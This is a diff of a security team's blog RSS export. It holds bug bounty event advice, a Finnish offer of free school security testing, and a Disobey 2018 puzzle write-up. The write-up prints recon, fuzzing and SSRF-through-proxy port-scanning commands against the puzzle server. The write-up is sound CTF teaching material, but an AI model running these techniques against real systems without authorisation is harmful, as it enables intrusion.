+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Ask for consent before unleashing your media team on hackers for surprise photoshoots.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Allow teams to see reported vulnerabilities (at least the subject of each report) so hackers know not to spend time on duplicate vulnerabilities that will be disqualified.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Explain what is and what isn’t a duplicate report to avoid confusion.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Require a definition of impact and a working POC (Proof of Concept) for each reported vulnerability so that the issue is easily reproduced.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Consider if you want to ban or limit the use of automated scanners. They can help find vulnerabilities but can also negatively affect the system and event by generating excessive amount of traffic.</span></li>
+<li>Inform teams that all confidential material such as vulnerability details should be removed from hacker&#8217;s devices before leaving the event.</li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Be prepared to make judgement and decisions swiftly on the spot. Have a clear jury/judge who can make decisions.</span></li>
+</ul>
+<h2><span style="font-weight: 400;">Schedule</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Time used to test the target application will of course affect the test coverage. In general, minimum of eight (8) hours should be reserved for testing.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">At the start of the event, go through the rules and specify what is in scope.</span></li>
+</ul>
+<h2><span style="font-weight: 400;"></span></h2>
+<h2><span style="font-weight: 400;">Other</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Identify (drivers license or other) each attending hacker.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Collect bank account details (if applies) for bounty payments.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Prepare a reporting platform for handling vulnerability reports.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Consider allowing internet access to hackers so they can access more resources (e.g ad-hoc research).</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">It is recommended to have technically inclined staff (developers) and a product owner on site to answer questions and help the jury evaluating vulnerability impact.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">The event must have jury which will decide and evaluate severity and impact of each vulnerability and the possible bounty sum.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Assist students and/or newbies by guiding them and getting them to know “seniors”. Attract more experienced hackers to teach the juniors with some small reward.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">When the event ends, kill the connections to the target, this way you can be sure that no one tests anymore.</span></li>
+</ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Team ROTin #kouluhaaste</title>
+		<link>/team-rotin-kouluhaaste/</link>
+		
+		<dc:creator><![CDATA[woltage]]></dc:creator>
+		<pubDate>Mon, 11 Mar 2019 04:51:06 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">/?p=1527</guid>
+
+					<description><![CDATA[Tämän avoimen kirjeen on tarkoitus tavoittaa yliopistojen, ammattikorkeakoulujen, lukioiden ja ammattikoulujen tietoturvasta päättävät henkilöt. Team ROT tarjoaa yhdelle Suomalaiselle koululle ilmaisen teknisen tietoturvatestauksen.]]></description>
+										<content:encoded><![CDATA[
+<p></p>
+
+
+<p><span style="font-weight: 400;">Tämän avoimen kirjeen on tarkoitus tavoittaa yliopistojen, ammattikorkeakoulujen, lukioiden ja ammattikoulujen tietoturvasta päättävät henkilöt. Team ROT tarjoaa yhdelle Suomalaiselle koululle ilmaisen teknisen tietoturvatestauksen.</span><br />
+<span style="font-weight: 400;">Olemme Team ROT, meitä on kuusi henkilöä ja tietoturva on intohimomme. Teemme teknisiä tietoturvatestauksia järjestelmiin ja laitteistoihin, sekä vapaa-ajallamme, että päivätyöksemme. Olemme osallistuneet lukuisiin haavoittuvuuspalkinto-ohjelmiin (engl. “Bug Bounty program”) maailmanlaajuisesti ja tiimimme jäsenet ovatkin tunnettuja myös kansainvälisesti. Nyt haluamme parantaa Suomen koulujen tietoturvallisuutta ja haluamme tarjota yhdelle Suomen koululle ilmaisen työpanoksemme, jotta Suomi ja suomalaisten koulujen järjestelmät saadaan turvallisemmaksi.</span><br />
+<span style="font-weight: 400;">Team ROT järjesti vuonna 2017 #kuntahaaste -kampanjan, jossa tekemällämme työpanoksella paransimme Suomalaisten kuntien tietoturvallisuutta. Vuonna 2018 osallistuimme Visman järjestämään Visma Hackday -tapahtumaan, jossa testattiin useiden koulujen käyttämän Wilma-järjestelmän tietoturvallisuutta (<a href="https://www.visma.fi/blog/visma-hackday-suomi-ruotsi-maaottelu/">https://www.visma.fi/blog/visma-hackday-suomi-ruotsi-maaottelu/</a>). Nyt haluammekin jatkaa tällä Suomalaisten koulujen tietojärjestelmien tietoturvallisuutta edistävällä tiellä, ja olemmekin päättäneet lanseerata #kouluhaaste -kampanjan.</span><br />
+<b>Pyydämme halukkaita kouluja ilmoittautumaan mukaan #kouluhaaste -kampanjaan huhtikuun 2019 loppuun mennessä lähettämällä vapaamuotoisen ilmoittautumisen sähköpostiosoitteeseen <a href="mailto:team@rot.fi">team@rot.fi</a></b><span style="font-weight: 400;">. Team ROT valitsee halukkaiden koulujen joukosta yhden koulun, johon tietoturvatestaus suoritetaan. Testaus sisältää teknisen tietoturvatestauksen, joka suoritetaan Team ROT -jäsenten toimesta valitun koulun järjestelmiin yhden, vielä määrittelemättömän viikonlopun aikana. Team ROT kontaktoi valittua koulua toukokuun 2019 alkupuolella.</span><br />
+<b>Tietoa testausprosessista</b><br />
+<span style="font-weight: 400;">Jotta tietoturvatestaus olisi mahdollisimman sujuva ja reilu molemmille osapuolille, koulu voi määritellä itse halutun kohteen tai kohteet sekä halutessa rajata tietyt testitapaukset pois testauksesta. Team ROT kuitenkin suosittelee, että testauksen kohteena olisi mukana mahdollisimman laaja osa koulun järjestelmiä. Näin ollen koulu hyötyy Team ROT:in tekemästä työstä mahdollisimman laajasti.</span><br />
+<span style="font-weight: 400;">Testausaikana Team ROT pyrkii olemaan aiheuttamatta ongelmia kohdejärjestelmien saatavuuden, eheyden ja luottamuksellisuuden kanssa, mutta kuten kaikessa testauksessa, odottamattomia ongelmia voi esiintyä. Täten Team ROT ei ota vastuuta mahdollisista ongelmista, jotka testaus suorasti tai epäsuorasti voi aiheuttaa. Team ROT suosittelee, että testaus suoritetaan sellaisena ajankohtana jolloin mahdollisista esiintyvistä ongelmista aiheutuu mahdollisimman vähän haittaa koulun normaalille toiminnalle, esim. testaus suoritetaan viikonloppuna koulun loma-aikana.</span><br />
+<span style="font-weight: 400;">Testauksen lopputuotoksena kirjoitetaan raportti, jossa raportoidaan kaikki testauksen aikana havaitut tietoturvaongelmat. Raportti toimitetaan koulun tietoturvatestaukseen valitulle yhteyshenkilölle, yleensä koulun tietoturvavastaavalle. Jos havainto koskee koulun ulkopuolista organisaatiota tai kolmannen osapuolen toimittajan sovellusta, Team ROT ilmoittaa havainnoista myös Traficomin kyberturvallisuuskeskukselle, CERT-FI:lle. Tämä sen takia, että haavoittuvuuskoordinointi kolmansien osapuolten kanssa onnistuisi mahdollisimman sujuvasti. Kun raportoidut havainnot ovat korjattu, Team ROT julkaisee niistä yhteenvedon. Yhteenveto käydään lävitse ennen sen julkaisemista yhdessä koulun kanssa ja sisällöstä poistetaan osapuolten halujen mukaisesti luottamuksellinen ja/tai yksilöivä tieto.</span><br />
+<span style="font-weight: 400;">Team ROT pidättää oikeuden julkaista tiedon haavoittuvuuksien kokonaismäärästä jo ennen tietoturvahaavoittuvuuksien korjaamista, mutta tarkempia tietoja haavoittuvuuksista tai osallistuvaa koulun nimeä ei julkaista ennen tietoturvahaavoittuvuuksien korjaamista tai erillistä testattavan koulun antamaa kirjallista lupaa.</span><br />
+<span style="font-weight: 400;">Terveisin,<br />
+</span><strong>Team ROT</strong><br />
+<span style="font-weight: 400;">Team ROTia #kouluhaaste’eessa tukemassa:</span><br />
+<a href="https://www.visma.fi/"><img decoding="async" class=" alignnone" src="https://upload.wikimedia.org/wikipedia/fi/thumb/2/2b/Visma_logo.svg/1280px-Visma_logo.svg.png" alt="Image result for visma logo" width="219" height="41"></a><br />
+<a style="background-color: #ffffff; box-shadow: 0 0 0 1px rgba(var(--color-primary-rgb), 0.2);" href="https://www.solita.fi/"><img decoding="async" class=" alignnone" src="https://www.movesense.com/wp-content/uploads/2018/11/Solita-logo-transparent.png" alt="Image result for solita logo" width="218" height="51"></a><br />
+<a href="https://www.elisa.fi/"><img decoding="async" class=" alignnone" src="https://corporate.elisa.fi/img/logot/Elisa_logo_blue_RGB.png" alt="Image result for elisa logo" width="156" height="110"></a></p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Solving the Disobey 2018 puzzle</title>
+		<link>/solving-the-disobey-2018-puzzle/</link>
+		
+		<dc:creator><![CDATA[lokori]]></dc:creator>
+		<pubDate>Mon, 17 Sep 2018 07:42:57 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">https://rot.fi/?p=1414</guid>
+
+					<description><![CDATA[This is a writeup for the Disobey 2018 hacker ticket puzzle. There were 50 "hacker" tickets available and the puzzle was open for about a month. It was a bit tougher this time than it was in previous years.]]></description>
+										<content:encoded><![CDATA[<p>This is a writeup for the <a href="https://disobey.fi/">Disobey 2018 </a>hacker ticket puzzle. There were 50 &#8220;hacker&#8221; tickets available and the puzzle was open for about a month. It was a bit tougher this time than it was in previous years.</p>
+<h2>Spoiler alert</h2>
+<p><strong><span style="color: #ff0000;">WARNING: This obviously CONTAINS SPOILERS.</span> </strong>Do not read further if you want to solve it yourself! And you should try (harder)!</p>
+<hr>
+<p>It began with the URL&nbsp;<a href="http://puzzle.disobey.fi/">http://puzzle.disobey.fi/</a>.</p>
+<h2>Quick recon</h2>
+<p>First thing I&#8217;m used to doing is recon with <strong><em>nmap</em></strong></p>
+<blockquote><p>nmap -v -sC -sV -oA initial_nmap puzzle.disobey.fi</p></blockquote>
+<p>This quickly revealed two webservers. The other one only replied &#8220;Try harder&#8221;, a good tip indeed.<br />
+The other one had a standard nginx web page.<br />
+<img decoding="async" class="alignnone size-full wp-image-1417" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09.png" alt="Screen Shot 2018-09-17 at 10.47.09" width="2492" height="736" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09.png 2492w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-300x89.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-1030x304.png 1030w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-768x227.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-1536x454.png 1536w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-2048x605.png 2048w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-1500x443.png 1500w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-705x208.png 705w" sizes="(max-width: 2492px) 100vw, 2492px" /><br />
+HTML source for the test page reveals there&#8217;s a resource <strong><em>lorem.html</em></strong>&nbsp;. So I downloaded that, but what to do with the seemingly standard &#8220;lorem ipsum&#8221; stuff?<br />
+At the same time, my standard approach to <a href="https://www.hackthebox.eu/">HackTheBox</a> is to crawl for additional hidden resources left &#8220;accidentally&#8221; in the web server. So <em><strong>nikto</strong></em> + <em><strong>dirb</strong></em> + <em><strong>gobuster</strong></em> it is.<br />
+My normal HTB enumerator uses Kali linux standard lists and some additional ones from the <a href="https://github.com/danielmiessler/SecLists">SecLists</a>.<br />
+https://gist.github.com/lokori/3ba0a98ab9cf9f1b17f83151295c666a<br />
+This crawling revealed <em><strong>.bash_history</strong></em> which lead to an SQL file, but that didn&#8217;t lead to&nbsp; anything interesting.<br />
+So, back to lorem.html. With this kind of puzzle it&#8217;s important to remember that everything is not relevant to the solution, but the relevant hints and resources are provided in the puzzle. I need to remind myself of that when I get stuck.</p>
+<h2>lorem lorem lorem</h2>
+<p>Cut it into separate words.</p>
+<blockquote><p>cat pier.sh<br />
+#!/bin/bash<br />
+for word in $(&lt;lorem.html)<br />
+do<br />
+echo &#8220;$word&#8221;<br />
+done<br />
+./pier.sh &lt; lorem.html | sed s/[\.,]//g|sort|uniq &gt; lorems.txt</p></blockquote>
+<p>and then</p>
+<blockquote><p>cat lorems.txt |xargs -I {} curl -O &#8216;http://puzzle.disobey.fi/{}&#8217;</p></blockquote>
+<p>Now we get</p>
+<blockquote><p>ls -laS<br />
+-rw-r&#8211;r&#8211; 1 root root 3650 Aug 2 09:08 vulputate<br />
+-rw-r&#8211;r&#8211; 1 root root 1421 Aug 2 09:07 lorems.txt<br />
+-rw-r&#8211;r&#8211; 1 root root 11 Aug 2 09:08 Interdum</p></blockquote>
+<p>Okay.. clearly one reply is very different!<br />
+It says: <em><strong>&#8220;Wrong vhost&#8221;</strong></em><br />
+ok, so let&#8217;s <em><strong>curl</strong></em> again with another vhost?</p>
+<blockquote><p>curl &#8211;header &#8216;Host: julli.disobey.fi&#8217; http://puzzle.disobey.fi/Interdum<br />
+Try harder &#8211; admin</p></blockquote>
+<p>So this seems kind of promising, but what is the proper virtual host?<br />
+Not one of these.</p>
+<blockquote><p>cat lorems.txt |xargs -I {} curl -o {} &#8211;header &#8216;Host: {}.disobey.fi&#8217; &#8216;http://puzzle.disobey.fi/Interdum&#8217;</p></blockquote>
+<p>It took a while, but the answer was not very complicated after all.</p>
+<blockquote><p>curl &#8211;header &#8216;Host: admin&#8217; http://puzzle.disobey.fi/Interdum<br />
+Greetings! Love you &lt;3 &#8211; I need -love also</p></blockquote>
+<p>Okay, let&#8217;s make some &#8220;-love&#8221; then..</p>
+<blockquote><p>curl &#8211;header &#8216;Host: admin&#8217; http://puzzle.disobey.fi/Interdum-love</p></blockquote>
+<h2>Secrets</h2>
+<p>Now we find a nice text file.</p>
+<blockquote><p>cat secret.txt<br />
+Hi John!<br />
+Here is that secret email &#8211; encrypted with your favorite PIN-code!<br />
+SnVzdCBraWRkaW5nIC0gYmFzZTY0IGlzIGF3ZXNvbWUu</p></blockquote>
+<p>Base64 decode says <em><strong>&#8220;Just kidding &#8211; base64 is awesome.&#8221;</strong></em><br />
+Heh. Hah. Hoh. We still have test.php there. It is a small file so it can&#8217;t be very complicated to exploit it and it&#8217;s the only lead we have now.<br />
+Perhaps there is a parameter that is exploitable, but what is the parameter name?&nbsp; There is <a href="https://github.com/xmendez/wfuzz"><em><strong>wfuzz</strong></em></a>, but let&#8217;s be old school.</p>
+<blockquote><p>cat /root/tools/SecLists/Discovery/DNS/namelist.txt |xargs -I {} curl &#8211;header &#8216;Host: admin&#8217; &#8216;http://puzzle.disobey.fi/Interdum-love/test.php?{}=123&#8217;</p></blockquote>
+<p>Still no luck. At this point I was very frustrated and angry at myself.</p>
+<h2>Black hat Python</h2>
+<p>When I get frustrated in this way I usually write some Python to take full control of the issue. So, I wrote this one-time piece.<br />
+<img decoding="async" class="alignnone size-full wp-image-1426" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50.png" alt="Screen Shot 2018-09-20 at 9.23.50.png" width="1290" height="1312" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50.png 1290w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-295x300.png 295w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-1013x1030.png 1013w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-80x80.png 80w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-768x781.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-36x36.png 36w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-693x705.png 693w" sizes="(max-width: 1290px) 100vw, 1290px" /><br />
+<span style="background-color: #ffffff; color: #3d596d;">This tries sufficiently different values for each parameter name candidate. Given the proper word lists this finally found the parameter name, which was simply &#8220;url&#8221;.</span><br />
+How to exploit that?<br />
+Randomly trying some numbers.</p>
+<blockquote><p>curl -v &#8211;header &#8216;Host: admin&#8217; &#8216;http://puzzle.disobey.fi/Interdum-love/test.php?url=1234561251&#8217;* Trying 185.86.149.26&#8230;</p></blockquote>
+<p>Resulted in &#8220;504 Gateway Time-out&#8221;. Hmm.</p>
+<blockquote><p>curl -v &#8211;header &#8216;Host: admin&#8217; &#8216;http://puzzle.disobey.fi/Interdum-love/test.php?url=213070643/index.html&#8217;</p></blockquote>
+<p>Gave out &#8221;&nbsp;HTTP/1.1 403 WAF&#8221;.<br />
+It&#8217;s a HTTP proxy! The numbers in the URL can be translated into IP addresses which enables us proxy GET requests. Let&#8217;s try the other web server in the puzzle machine through this (as the call comes from the localhost, it might behave differently):</p>
+<blockquote><p>curl &#8211;header &#8216;Host: admin&#8217; &#8216;http://puzzle.disobey.fi/Interdum-love/test.php?url=0:8021%2f2&#8217;</p></blockquote>
+<p>And in fact, it does! There is a one character different in the reply &#8220;Try harder!1&#8221; vs. &#8220;Try harder!&#8221; but this doesn&#8217;t lead to anything interesting.</p>
+<h2>Proxy as a port scanner</h2>
+<p>This is one of the standard tricks &#8211; if there is an open proxy, it can be used to scan the internal network for ports and services not directly accessible from the outside. Let&#8217;s go!<br />
+Very crude scanner in Python.<br />
+<img decoding="async" class="alignnone size-full wp-image-1427" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35.png" alt="Screen Shot 2018-09-20 at 9.28.35.png" width="1164" height="662" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35.png 1164w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35-300x171.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35-1030x586.png 1030w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35-768x437.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35-705x401.png 705w" sizes="(max-width: 1164px) 100vw, 1164px" /><br />
+We find SSH server and.. finally, something very interesting came up!</p>
+<blockquote><p>FOUND !! 0:40053 // 51<br />
+H4sIAI5uYVsAA+3STUgUURwA8Oe2OyyGHyF4qMtb6KAXm+eubq7rmq5bFuWaHxGWyrrO5ObuzjI7Yx+o+47mQTp16rRHE9HwEBjjhjVUsBHdqktQxtQgSpgHE+utRkGEdBEJ/j8Y3vzn//HewOuTJCUqhfoFGe0ZnuerXS6cW93VVdsrX7kTM4QnboKJ0+nkK6vdlTzBPHHyLjfC/N4d6Tc1qYRkdpRBV4zsVsfKRHGX/M7P4F/rf+KzbRihzY2x0vYUyZC35Bl5RdbJd7L8EA1PvJzITLybML7No9FxVsAv8+uzlgUbmrPMHMiWyHalZDZv64m5zH/IlgTVj9rVlPHe8ule3n7/FPhHnZMiyYi1HJJN28pGVHeszmDroXQN9XAeqqDoVibtoSZq17la6tQ5L60wLV36NJ+xYmtxuo6lVnXORyvS9VTnTuSy01svrLZ0AwsbqUfn/PS4zjVRXucCtFLnTlKyUEONFqT1poznSBtNGY/RwlFq3ETU56IN6jHqq6J+tYz6qmmj6qA+N21SD2v3U8ZdpLG6O0hzUOM20t6kjHG0saYtpYwEoiMWp+rUAxY3HbETpVwP2IkeKKzXA0V1P2/1umaj80XIP+VFir3s6dajsTzzy+KDFW1jbQ5lS7125aC3QDkyV5gtnjSXgzq75IUz9mzxDGYPW83XLC5g7/nZ4sXOW0sXtI6UYUc9hpWdwtycsmcULtdsfl1ElxzduLWh5bQfozZJVQQcbM8vQE2R5CCWhVA/FkORqNDvYN9aZen6DZwU5CFBxoqE1aSARUnGoqCEByLxK1hklUlcJiWUiBQPRcs9GPmleFwI5+JcRywiy7mG7ZF4KBLCidxMVtcciipsRAXbJsjGi1HpGi7zDwjhwaQaY33JWIhtUo5Z/tSZi83hs8HucwPnO/raYpc7E73RZKS3K9wTRyz9pwZ/Y9M+XFYAAAAAAAAAAAAAAAAAAAAAAAAAAPAXPwDTbo0GACgAAA==1</p></blockquote>
+<p>So what is this?</p>
+<blockquote><p>cat pokale.txt | base64 -d &gt; pokale.bin<br />
+file pokale.bin<br />
+pokale.bin: gzip compressed data, last modified: Wed Aug 1 08:25:50 2018, from Unix</p></blockquote>
+<p>Ok, so a zip file. Our next step obviously.</p>
+<h2>Mystery binary</h2>
+<p>First standard thing is to run <em><strong>strings.</strong></em></p>
+<blockquote><p>bootloader<br />
+000644<br />
+000765<br />
+000024<br />
+00000010171 13330267201 013047<br />
+ustar<br />
+00k4m1<br />
+staff<br />
+000000<br />
+000000<br />
+[!] PANIC<br />
+Route OS<br />
+Disk read failed!<br />
+Proxy server to use for fetching files (optional):<br />
+Connection to mirror failed via proxy:<br />
+Halting.<br />
+Overflow (Checksum mismatch)<br />
+GJXHcLO]MhQTbRm\Up_lsi_Zc^n<br />
+ACBD</p></blockquote>
+<p>So a bootloader, but two strings are interesting. <em><strong>&#8220;00k4m1&#8221;</strong></em>&nbsp;means the <a href="https://twitter.com/_k4m1_">great k4m1</a> has signed this binary! In the end,&nbsp;<em><strong>&#8220;GJXHcLO]MhQTbRm\Up_lsi_Zc^n&#8221;</strong></em>&nbsp;is very likely a decryption key or some secret we have to dissect.<br />
+Let&#8217;s try a shortcut.<br />
+<img decoding="async" class="alignnone size-full wp-image-1428" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37.png" alt="Screen Shot 2018-09-20 at 9.30.37.png" width="1014" height="618" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37.png 1014w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37-300x183.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37-768x468.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37-705x430.png 705w" sizes="(max-width: 1014px) 100vw, 1014px" /><br />
+Sometimes we could be lucky, but not today. So let&#8217;s look at the binary, properly.<br />
+There is nothing wrong with <a href="https://rada.re/r/">radare2</a> but I used <a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml">IDA free</a> in the end. I didn&#8217;t actually run the bootloader code at all. I just analyzed it and figured out what it does without stepping and debugging. The initial guess was correct &#8211; we need to decrypt the weird string, but it just wasn&#8217;t simple XOR.<br />
+<img decoding="async" class="alignnone size-full wp-image-1419" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.40.25.png" alt="Screen Shot 2018-08-06 at 16.40.25.png" width="680" height="612" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.40.25.png 680w, /wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.40.25-300x270.png 300w" sizes="(max-width: 680px) 100vw, 680px" /><br />
+Replicating the &#8220;decryption&#8221; algorithm in Python we get something sensible out of it:<br />
+<img decoding="async" class="alignnone size-full wp-image-1420" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07.png" alt="Screen Shot 2018-09-17 at 11.28.07.png" width="828" height="534" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07.png 828w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07-300x193.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07-768x495.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07-705x455.png 705w" sizes="(max-width: 828px) 100vw, 828px" /><br />
+The binary also points towards the other web server we found with the nmap so clearly we need to do something there, but there is no clear URL that gives us the ticket.</p>
+<h2>Alternate solution to binary</h2>
+<p>This is from another ROT member, Jarkko Vesiluoma:</p>
+<blockquote><p>cat something.base64 |base64 -d &gt; bootloader.gz<br />
+$ file ../bootloader2<br />
+../bootloader2: gzip compressed data, last modified: Wed Aug 1 08:25:50 2018, from Unix<br />
+$ file bootloader.raw<br />
+bootloader.raw: DOS/MBR boot sector<br />
+qemu-system-x86_64 -k fi -drive format=raw,file=bootloader.raw -s<br />
+other terminal: r2 -D gdb gdb://localhost:1234<br />
+In r2: vvv and then qq</p></blockquote>
+<p>Basically the memory of the running bootloader is accessed to get the decrypted value. It&#8217;s running inside a virtual machine so this is easy. In a way this is &#8220;cheating&#8221;, but this is a nice way to analyze an unknown binary, as long as potentially harmful actions are contained inside the virtual machine.</p>
+<h2>The final insult</h2>
+<p>Manual guessing is frustrating..</p>
+<blockquote><p>Try harder!root@kali:~/disobey/test# curl &#8211;header &#8216;Host: 123.0.0.5&#8217; &#8220;http://puzzle.disobey.fi:8021/?GIVE_GIVE_GIVE_ME_MY_TICKET&#8221;<br />
+Try harder!root@kali:~/disobey/test# curl &#8211;header &#8216;Host: 123.0.0.5&#8217; &#8220;http://puzzle.disobey.fi:8021/?ACBD=GIVE_GIVE_GIVE_ME_MY_TICKET&#8221;<br />
+Try harder!root@kali:~/disobey/test# curl &#8211;header &#8216;Host: 123.0.0.5&#8217; &#8220;http://puzzle.disobey.fi:8021/?GIVE_GIVE_GIVE_ME_MY_TICKET=ACBD&#8221;<br />
+Try harder!root@kali:~/disobey/test# curl &#8211;header &#8216;Host: 123.0.0.5&#8217; &#8220;http://puzzle.disobey.fi:8021/GIVE_GIVE_GIVE_ME_MY_TICKET&#8221;</p></blockquote>
+<p>So Python it is again! I was getting really worked up at this point after all this effort. How many times do I need to &#8220;try harder&#8221; to get the ticket?<br />
+<img decoding="async" class="alignnone size-full wp-image-1429" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50.png" alt="Screen Shot 2018-09-20 at 9.31.50.png" width="1616" height="1058" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50.png 1616w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-300x196.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-1030x674.png 1030w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-768x503.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-1536x1006.png 1536w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-1500x982.png 1500w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-705x462.png 705w" sizes="(max-width: 1616px) 100vw, 1616px" /></p>
+<p>We still need to find the right parameter list, but there is a reasonable one from the SecLists at our disposal.</p>
+<blockquote><p>python final_insult.py /root/tools/SecLists/Discovery/Web_Content/burp-parameter-names.txt<br />
+using word list /root/tools/SecLists/Discovery/Web_Content/burp-parameter-names.txt<br />
+FOUND !!data<br />
+HACKER! https://holvi.com/shop/Disobey/product/c995bdab7374d27f1250f1071c4a9b07/</p></blockquote>
+<p>So finally! There is a ticket.<br />
+<img decoding="async" class="alignnone size-full wp-image-1422" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.24.18.png" alt="Screen Shot 2018-08-06 at 16.24.18.png" width="483" height="146" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.24.18.png 483w, /wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.24.18-300x91.png 300w" sizes="(max-width: 483px) 100vw, 483px" /><br />
+You could have also done it with something like this using <em><strong>wfuzz</strong></em>:</p>
+<blockquote><p>wfuzz -c -z file,Web-Content/raft-large-words.txt &#8211;filter &#8220;c=200 and h&gt;11&#8221; -f disobey.1 -Z -H &#8216;Host: admin&#8217; http://puzzle.disobey.fi:8021/?FUZZ=GIVE_GIVE_GIVE_ME_MY_TICKET</p></blockquote>
+<h2>Closing words</h2>
+<p>I got really frustrated at some points during this process, but luckily I got some motivational push from other team ROT members (thank you Jarkko and Putsi). We solved this on our own, without really co-operating together, but it still helped to me to know that I&#8217;m wandering roughly to the right direction. Our solutions were different in the end as I like writing Python scripts when things get difficult. The other ROT guys are perhaps slightly more tool oriented.<br />
+I really liked the binary challenge part and overall I think the difficulty level was correct.&nbsp; It wasn&#8217;t too easy to get the hacker ticket, but perfectly doable for a motivated hacker.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Hack The Box for fun!</title>
+		<link>/1274/</link>
+		
+		<dc:creator><![CDATA[lokori]]></dc:creator>
+		<pubDate>Thu, 08 Mar 2018 12:17:07 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">https://rot.fi/?p=1274</guid>
+
+					<description><![CDATA[Fun experiences with Hack The Box and some advice for aspiring  hackers to get things going.]]></description>
+										<content:encoded><![CDATA[<h1>What is Hack The Box ?</h1>
+<p>A week ago I started hacking virtual machines and challenges at&nbsp;<a href="https://www.hackthebox.eu/">Hackthebox.eu</a>&nbsp;and it has been a lot of fun. <strong>Hack The Box</strong>&nbsp;provides it&#8217;s users with a virtual environment with dedicated vulnerable machines and some CTF-style challenges. This post contains some pointers and introductory tips for aspiring would-be hackers, but no spoilers and you still need to solve the invitation code.<br />
